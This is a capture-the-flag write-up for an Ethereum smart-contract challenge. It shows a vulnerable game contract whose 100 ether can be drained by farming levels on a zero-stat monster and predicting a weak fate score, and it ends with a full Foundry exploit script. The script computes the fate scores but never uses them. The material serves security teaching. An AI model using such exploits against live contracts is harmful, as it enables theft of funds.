+++
date = '2024-12-30T07:15:32+05:30'
draft = true
title = 'Dungeons and Naga'
categories=["Blockchain"]
series="War-Games-CTF"
tags=["Control Flow Manipulation"]
+++

# Writeup for Dungeons And Naga

- Before diving into this writeup, it’s crucial to have a solid understanding of Foundry, a powerful framework for Ethereum smart contract development. Foundry will be your primary tool for writing, testing, and breaking contracts in this guide.

### Challenge Description

The developer of this protocol really loves the movie so he decided to build a decentralized game out of it that lives on chain. He has spent all his life saving and really want the game to succeed. The game sets you on an adventure to find hidden treasure.

**Author:** MaanVad3r

### The Challenge and Exploit

The below are source contracts

1. **DungeonsNDragon** contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;



contract DungeonsAndDragons {
    struct Character {
        string name;
        uint256 level;
        uint256 experience;
        uint256 strength;
        uint256 dexterity;
        uint256 intelligence;
    }

    struct Dungeon {
        string name;
        uint256 difficulty;
        uint256 reward;
    }

    struct Monster {
        string name;
        uint256 health;
        uint256 attack;
    }

    struct Raid {
        string name;
        uint256 requiredLevel;
        uint256 reward;
    }

    mapping(address => Character) public characters;
    Dungeon[] public dungeons;
    Monster[] public monsters;
    Raid[] public raids;
    string public salt;
    uint256 public initialReward;
    uint256 public initialLevel;
    address public owner;
    
    event CharacterCreated(address indexed player, string name);
    event DungeonCompleted(address indexed player, string dungeonName, uint256 reward);
    event RaidCompleted(address indexed player, string raidName, uint256 reward);
    event MonsterDefeated(address indexed player, string monsterName);
    event FinalDragonDefeated(address indexed player);

    modifier nonReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }

    modifier onlyCreator() {
        require(msg.sender == owner, "Only the creator can call this function");
        _;
    }
    
    bool private locked;

    constructor(string memory _salt, uint256 _initialReward, uint256 _initialLevel) payable {
        require(msg.value == 100 ether, "Contract must be funded with 100 Ether");
        salt = _salt;
        initialReward = _initialReward;
        initialLevel = _initialLevel;
        owner = msg.sender;
    }

    fallback() external payable {}

    function createCharacter(string memory _name, uint256 _class) public payable {
        require(msg.value == 0.1 ether, "Must pay 0.1 ether to create a character");
        require(bytes(characters[msg.sender].name).length == 0, "Character already exists");
        
        uint256 strength;
        uint256 dexterity;
        uint256 intelligence;

        if (_class == 1) { // Warrior
            strength = 10;
            dexterity = 5;
            intelligence = 2;
        } else if (_class == 2) { // Rogue
            strength = 5;
            dexterity = 10;
            intelligence = 3;
        } else if (_class == 3) { // Mage
            strength = 2;
            dexterity = 3;
            intelligence = 10;
        }

        characters[msg.sender] = Character(_name, initialLevel, 0, strength, dexterity, intelligence);
        emit CharacterCreated(msg.sender, _name);
    }

    function createDungeon(string memory _name, uint256 _difficulty, uint256 _reward) public onlyCreator {
        dungeons.push(Dungeon(_name, _difficulty, _reward));
    }

    function createMonster(string memory _name, uint256 _health, uint256 _attack) public {
        monsters.push(Monster(_name, _health, _attack));
    }

    function createRaid(string memory _name, uint256 _requiredLevel, uint256 _reward) public onlyCreator {
        raids.push(Raid(_name, _requiredLevel, _reward));
    }

    function completeDungeon(uint256 _dungeonIndex) public nonReentrant {
        require(_dungeonIndex < dungeons.length, "Invalid dungeon index");
        Dungeon memory dungeon = dungeons[_dungeonIndex];
        Character storage character = characters[msg.sender];

        require(character.level >= dungeon.difficulty, "Character level too low");

        character.experience += dungeon.reward;
        character.level++;
        character.experience = 0;

        emit DungeonCompleted(msg.sender, dungeon.name, dungeon.reward);
    }

    function completeRaid(uint256 _raidIndex) public nonReentrant {
        require(_raidIndex < raids.length, "Invalid raid index");
        Raid memory raid = raids[_raidIndex];
        Character storage character = characters[msg.sender];

        require(character.level >= raid.requiredLevel, "Character level too low");

        character.experience += raid.reward;
        character.level++;
        character.experience = 0;

        emit RaidCompleted(msg.sender, raid.name, raid.reward);
    }

    function fightMonster(uint256 _monsterIndex) public nonReentrant {
        require(_monsterIndex < monsters.length, "Invalid monster index");
        Monster memory monster = monsters[_monsterIndex];
        Character storage character = characters[msg.sender];

        uint256 fateScore = uint256(keccak256(abi.encodePacked(msg.sender, salt, uint256(42)))) % 100;
        
        require(fateScore > 30, "Monster fight failed! Bad luck!");

        if (character.strength + character.dexterity + character.intelligence > monster.health + monster.attack) {
            emit MonsterDefeated(msg.sender, monster.name);
            character.experience += 50;
            character.level++;
            character.experience = 0;
        } else {
            revert("Monster too strong! Failed to defeat");
        }
    }

    function finalDragon() public nonReentrant {
        Character storage character = characters[msg.sender];
        require(character.level >= 20, "Character level too low to fight the final dragon");

        uint256 fateScore = uint256(keccak256(abi.encodePacked(msg.sender, salt, uint256(999)))) % 100;
       

        if (fateScore > 50) {
            (bool success, ) = msg.sender.call{value: address(this).balance}("");
            require(success, "Reward transfer failed");
            emit FinalDragonDefeated(msg.sender);
        }
    }

    function withdraw() public onlyCreator {
        require(address(this).balance > 0, "No balance to withdraw");
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Withdraw failed");
    }

    function getCharacter(address _player) public view returns (Character memory) {
        return characters[_player];
    }

    function distributeRewards(bytes32 messageHash, uint8 v, bytes32 r, bytes32 s) public {
        address signer = ecrecover(messageHash, v, r, s);
        require(signer == owner, "Invalid signature");

        //distribute rewards logic
        Character storage character = characters[msg.sender];
        character.experience += 10;  
    }
}

```

2. **Setup** contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./DungeonsNDragons.sol";

contract Setup {
    DungeonsAndDragons public challengeInstance;

    constructor(string memory _salt, uint256 _initialReward, uint256 _initialLevel) payable {
        
        require(msg.value == 100 ether, "Setup requires exactly 100 ETH for the challenge");
        challengeInstance = new DungeonsAndDragons{value: msg.value}(_salt, _initialReward, _initialLevel);
    }

    
    function isSolved() public view returns (bool) {
        
        return address(challengeInstance).balance == 0;
    }
}

```


Our task is to make the `Setup:isSolved` function return true. This function will return true when the balance of the `DungeonsNDragons` contract becomes zero. The `DungeonsNDragons` contract is initialized with 100 ether during deployment. To solve this challenge, we need to drain and steal the 100 ether from `DungeonsNDragons` contract.


```solidity
function finalDragon() public nonReentrant {
    Character storage character = characters[msg.sender];
    require(character.level >= 20, "Character level too low to fight the final dragon");

    uint256 fateScore = uint256(keccak256(abi.encodePacked(msg.sender, salt, uint256(999)))) % 100;
       

    if (fateScore > 50) {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Reward transfer failed");
        emit FinalDragonDefeated(msg.sender);
    }
}
```

The `DungeonsNDragons:finalDragon` function is a public function, meaning anyone can call it. This is the only place where the entire ether balance of the `DungeonsNDragons` contract is transferred to the `msg.sender`. If we can find a way to successfully call this function, the challenge will be solved.

We can call this function only if our character's level is greater than 20. The function will transfer all the funds only if the `fateScore` is greater than 50. Since the `fateScore` depends on some known values, we can calculate it in advance and initiate the transaction only if the `fateScore` exceeds 50. Now let's focus on how to increase our character level

Character levels are increased through the `DungeonsNDragons:completeDungeon`, `DungeonsNDragons:completeRaid`, and `DungeonsNDragons:fightMonster` functions. However, we can only call `DungeonsNDragons:fightMonster` because no Dungeons or Raids have been created. Dungeons and Raids can only be created by the contract's creator (owner), while Monsters can be created by anyone. To proceed, we need to create a Monster with health and attack set to zero. Once the Monster is created, we can call `DungeonsNDragons:fightMonster`, passing the index of the Monster we created.

```solidity
function fightMonster(uint256 _monsterIndex) public nonReentrant {
    require(_monsterIndex < monsters.length, "Invalid monster index");
    Monster memory monster = monsters[_monsterIndex];
    Character storage character = characters[msg.sender];

    uint256 fateScore = uint256(keccak256(abi.encodePacked(msg.sender, salt, uint256(42)))) % 100;
        
    require(fateScore > 30, "Monster fight failed! Bad luck!");

    if (character.strength + character.dexterity + character.intelligence > monster.health + monster.attack) {
        emit MonsterDefeated(msg.sender, monster.name);
        character.experience += 50;
        character.level++;
        character.experience = 0;
    } else {
        revert("Monster too strong! Failed to defeat");
    }
}
```

Now, the only factor we need to consider when calling `DungeonsNDragons:fightMonster` is the fateScore. The fateScore is calculated based on parameters known to both the contract and `msg.sender`. Therefore, `msg.sender` can calculate the fateScore in advance. If the fateScore is greater than 30, then the function can be called successfully.

The below is the exploit script.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

interface IDungeons{
    function createCharacter(string memory _name, uint256 _class) external payable ;
    function finalDragon() external;
    function distributeRewards(bytes32 messageHash, uint8 v, bytes32 r, bytes32 s) external ;
    function salt()external view returns (string memory);
    function createMonster(string memory _name, uint256 _health, uint256 _attack) external ;
     function fightMonster(uint256 _monsterIndex) external;
}

interface ISetup{
    function challengeInstance()external view returns(IDungeons);
    function isSolved() external view returns (bool);
}

contract ExploiotChallenge {

    ISetup setup;
    IDungeons dungeons;
    uint256 fateScore1 ;
    uint256 fateScore2;
    constructor(address _setup){
        setup=ISetup(_setup);
        dungeons=setup.challengeInstance();
        
        
    }

    function Exploit()public payable{
        fateScore2=uint256(keccak256(abi.encodePacked(msg.sender, dungeons.salt(), uint256(999)))) % 100;
        fateScore1 = uint256(keccak256(abi.encodePacked(msg.sender, dungeons.salt(), uint256(42)))) % 100;
        dungeons.createCharacter{value:msg.value}("h4ck3r",1);
        dungeons.createMonster("m0nst3r", 0, 0);
        for(uint8 i=0;i<20;i++){
            dungeons.fightMonster(0);
        }
        dungeons.finalDragon();
    }

    receive()external payable{}
}



contract CreateExploit is Script{
    ExploiotChallenge exploit;

    function run()public{
        address setup=address(/* YOUR_SETUP_ADDRESS */);
        vm.startBroadcast();
        exploit=new ExploiotChallenge(setup);
        exploit.Exploit{value:0.1 ether}();
        vm.stopBroadcast();
    }
}
```


<p style="text-align:center;">***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p>